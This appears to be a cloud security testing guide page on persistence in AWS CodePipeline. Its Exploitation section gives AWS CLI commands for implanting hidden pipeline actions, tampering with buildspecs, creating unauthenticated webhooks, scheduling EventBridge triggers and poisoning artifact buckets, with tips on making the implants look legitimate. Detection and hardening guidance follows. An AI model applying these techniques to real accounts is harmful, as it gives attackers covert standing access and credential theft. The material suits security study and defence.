---
cstg_id: CSTG-AWS-CODEPIPELINE-PERSIST
title: "AWS Codepipeline - Persistence"
provider: aws
service: codepipeline
phase: persistence
required_access: assumed-breach
required_permissions:
  - codepipeline:CreatePipeline
  - codepipeline:UpdatePipeline
  - codepipeline:PutWebhook
  - codepipeline:RegisterWebhookWithThirdParty
  - codepipeline:CreateCustomActionType
  - codebuild:UpdateProject
  - codebuild:CreateProject
  - iam:PassRole
  - codestar-connections:UseConnection
  - s3:PutObject
  - events:PutRule
  - events:PutTargets
references:
  - https://docs.aws.amazon.com/codepipeline/latest/APIReference/Welcome.html
  - https://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-webhooks.html
  - https://docs.aws.amazon.com/codepipeline/latest/userguide/actions-create-custom-action.html
  - https://docs.aws.amazon.com/codepipeline/latest/userguide/security-iam.html
  - https://docs.aws.amazon.com/codepipeline/latest/userguide/triggering.html
  - https://hackingthe.cloud/aws/post_exploitation/
  - https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
license: CC BY-SA 4.0
---

## Summary

Because a pipeline runs continuously - on every source change, schedule, or
external trigger - and executes with an IAM service role, CodePipeline is an
attractive vehicle for **durable persistence and re-entry** in an AWS account.
Unlike a one-shot privilege-escalation action, a tampered pipeline keeps
granting access on every future execution and is easily mistaken for legitimate
CI/CD activity.

Persistence techniques in CodePipeline fall into several families:

1. **Trigger-based re-entry** - webhooks, EventBridge/CloudWatch Events rules,
   schedules, and polling source actions that fire attacker-controlled stages
   automatically.
2. **Embedded payload in the pipeline definition** - a hidden build/invoke/deploy
   action, or a tampered CodeBuild project/buildspec, that re-establishes access
   each run.
3. **Source / artifact-store poisoning** - planting a payload in a trusted
   source or in the artifact bucket so every build re-deploys it.
4. **Custom action job workers** - a registered custom action type plus a
   poller that periodically receives credentials.
5. **Connection abuse** - reusing an `AVAILABLE` CodeStar/CodeConnections
   connection to maintain access to source repositories.

This page assumes an assumed-breach posture with the ability to write
CodePipeline/CodeBuild configuration, and builds on
[AWS CodePipeline - Enumeration](../02-services/aws-codepipeline-enum.md)
and
[AWS CodePipeline - Privilege Escalation](../03-privilege-escalation/aws-codepipeline-privesc.md).

## Prerequisites

- A principal able to create or modify pipelines, CodeBuild projects, webhooks,
  custom action types, or EventBridge rules (see permissions above).
- For trigger-based persistence, knowledge of the source trigger model
  (webhook secret/URL, EventBridge rule pattern, or polling source).
- For payload-based persistence, an action role / pipeline role that grants the
  desired standing capability (e.g. ability to exfiltrate credentials or mint
  new IAM principals on each run).

## Enumeration

Establish a baseline so the implant blends in and so cleanup can be detected:

```bash
aws codepipeline list-pipelines
aws codepipeline list-webhooks
aws codepipeline list-action-types --action-owner-filter Custom
aws events list-rules --query 'Rules[?contains(Arn,`codepipeline`)||State==`ENABLED`]'
aws codestar-connections list-connections \
  --query 'Connections[?ConnectionStatus==`AVAILABLE`]'
```

Record existing naming conventions, tags, and trigger patterns so additions
mimic legitimate resources.

## Misconfigurations & Findings

- Pipelines or CodeBuild projects with hidden extra actions/commands that
  re-deploy a payload each run.
- Webhooks with weak or no authentication that allow external triggering.
- EventBridge rules targeting pipelines that were not created by the platform
  team.
- Custom action types registered with an over-broad job-worker role.
- Artifact buckets writable by principals outside the CI/CD boundary.
- Long-lived `AVAILABLE` source connections not tied to an active pipeline.

## Exploitation

Subsections are keyed to the enabling permission(s).

### codepipeline:UpdatePipeline / CreatePipeline (embedded action implant)

Insert an inconspicuous build or invoke action - early in the pipeline or in a
stage that runs on every execution - that re-establishes access under the
pipeline/action role. Naming it like a legitimate step (`Test`, `Lint`,
`Notify`) reduces suspicion.

```bash
aws codepipeline get-pipeline --name <target> --query pipeline > p.json
# Add an action that runs an attacker-controlled CodeBuild project or invokes
# an attacker Lambda; keep outputs/inputs consistent so the pipeline still works.
aws codepipeline update-pipeline --pipeline file://p.json
```

Because the action fires on every run, it provides recurring credential
exfiltration or beaconing without further attacker interaction.

### codebuild:UpdateProject (buildspec implant)

Modify the buildspec of a CodeBuild project the pipeline already uses so each
build performs a small persistence step (mint credentials, post to an external
endpoint, re-create a removed resource). This leaves the pipeline definition
unchanged, making the implant harder to spot.

```bash
aws codebuild update-project --name <project> --source \
  'type=CODEPIPELINE,buildspec=version: 0.2\nphases:\n  pre_build:\n    commands:\n      - <persistence-step>'
```

### codepipeline:PutWebhook / RegisterWebhookWithThirdParty (trigger re-entry)

Create a webhook so the attacker can trigger the (implanted) pipeline on demand
from outside, independent of normal source events.

```bash
cat > wh.json <<'JSON'
{ "webhook": {
    "name": "build-notify-hook",
    "targetPipeline": "<target>",
    "targetAction": "<source-action>",
    "filters": [{ "jsonPath": "$.ref", "matchEquals": "refs/heads/{Branch}" }],
    "authentication": "UNAUTHENTICATED",
    "authenticationConfiguration": {}
}}
JSON
aws codepipeline put-webhook --cli-input-json file://wh.json
aws codepipeline register-webhook-with-third-party --webhook-name build-notify-hook
# The returned URL triggers the pipeline on demand.
```

(Using `GITHUB_HMAC` with an attacker-known secret is stealthier than
`UNAUTHENTICATED`.)

### events:PutRule + events:PutTargets + iam:PassRole (scheduled re-entry)

Register an EventBridge rule (scheduled or event-pattern) that starts the
pipeline automatically, ensuring the implant fires even if the source trigger is
removed.

```bash
aws events put-rule --name daily-build-check --schedule-expression 'rate(6 hours)'
aws events put-targets --rule daily-build-check --targets \
  "Id=1,Arn=arn:aws:codepipeline:<region>:<acct>:<pipeline>,RoleArn=arn:aws:iam::<acct>:role/<events-invoke-role>"
```

### codepipeline:CreateCustomActionType + PollForJobs (job-worker persistence)

Register a custom action type and run a long-lived poller. The poller
periodically receives jobs - and the configured action credentials/artifacts -
providing a recurring credential channel that looks like a normal build worker.

```bash
aws codepipeline create-custom-action-type \
  --category Build --provider int-build-agent --version 1 \
  --input-artifact-details maximumCount=1,minimumCount=0 \
  --output-artifact-details maximumCount=1,minimumCount=0 \
  --settings entityUrlTemplate=https://example.invalid,executionUrlTemplate=https://example.invalid
# Then add an action of this type to a pipeline and poll for jobs out-of-band.
```

### s3:PutObject (artifact-store / source poisoning)

Plant a payload in the trusted source object or in the artifact-store bucket so
that subsequent builds redeploy it. This survives edits to the pipeline
definition because the malicious content lives in the data plane.

```bash
aws s3 cp implant.zip s3://<source-bucket>/<source-key>
```

### codestar-connections:UseConnection (SCM access persistence)

A live `AVAILABLE` connection grants ongoing access to the linked external
repositories. Reusing it (e.g. to keep a poisoned branch or to read source)
maintains supply-chain access without provisioning new credentials.

## Detection & Logging

These actions are recorded in **CloudTrail** from `codepipeline.amazonaws.com`,
`codebuild.amazonaws.com`, `events.amazonaws.com`,
`codestar-connections.amazonaws.com`, and `s3.amazonaws.com`. High-signal
events:

- `CreatePipeline` / `UpdatePipeline` adding or altering actions (diff the
  pipeline definition / `version` over time).
- `PutWebhook` / `RegisterWebhookWithThirdParty`, especially with
  `UNAUTHENTICATED` authentication.
- `CreateCustomActionType` and recurring `PollForJobs` /
  `AcknowledgeJob` from an unexpected principal/IP.
- `codebuild:UpdateProject` changing `source`/`buildspec`.
- `events:PutRule` / `PutTargets` targeting a CodePipeline ARN, created by a
  non-platform principal.
- `s3:PutObject` to source or artifact buckets from outside the CI/CD boundary.
- `codestar-connections:UseConnection` from unusual identities.

Defenders should snapshot pipeline definitions, webhooks, custom action types,
and EventBridge rules, then alert on drift. Config rules and EventBridge
detections on the events above provide near-real-time coverage. Track pipeline
`version` increments and reconcile each against an approved change.

## Remediation & Hardening

- Treat pipeline and CodeBuild definitions as protected, version-controlled
  configuration; require review for changes and detect drift.
- Restrict `CreatePipeline`, `UpdatePipeline`, `UpdateProject`, `PutWebhook`,
  `CreateCustomActionType`, and EventBridge write actions to a small set of
  audited principals.
- Authenticate all webhooks (`GITHUB_HMAC` with strong secrets or tight `IP`
  filters); remove unauthenticated webhooks.
- Lock down source and artifact S3 buckets (block public access, object-lock /
  versioning, least-privilege bucket and KMS key policies); restrict
  `s3:PutObject` to the pipeline roles.
- Inventory and remove unused custom action types and CodeStar/CodeConnections
  connections; rotate connection trust periodically.
- Apply least privilege to pipeline, action, CodeBuild, and EventBridge-invoke
  roles, and scope `iam:PassRole` with `PassedToService` conditions.
- Enable CloudTrail management-event logging for all relevant services and
  alert on the drift/creation events above.

## Tools

- **AWS CLI / SDK** (`aws codepipeline`, `aws codebuild`, `aws events`,
  `aws codestar-connections`, `aws s3`).
- Configuration-drift detection and CloudTrail/EventBridge-based monitoring.

## References

- CodePipeline API Reference -
  https://docs.aws.amazon.com/codepipeline/latest/APIReference/Welcome.html
- Webhooks in CodePipeline -
  https://docs.aws.amazon.com/codepipeline/latest/userguide/pipelines-webhooks.html
- Create a custom action -
  https://docs.aws.amazon.com/codepipeline/latest/userguide/actions-create-custom-action.html
- Start a pipeline (triggers) -
  https://docs.aws.amazon.com/codepipeline/latest/userguide/triggering.html
- CodePipeline IAM / security -
  https://docs.aws.amazon.com/codepipeline/latest/userguide/security-iam.html
- AWS post-exploitation (hackingthe.cloud) -
  https://hackingthe.cloud/aws/post_exploitation/
- AWS privilege escalation methods and mitigation (Rhino Security Labs) -
  https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
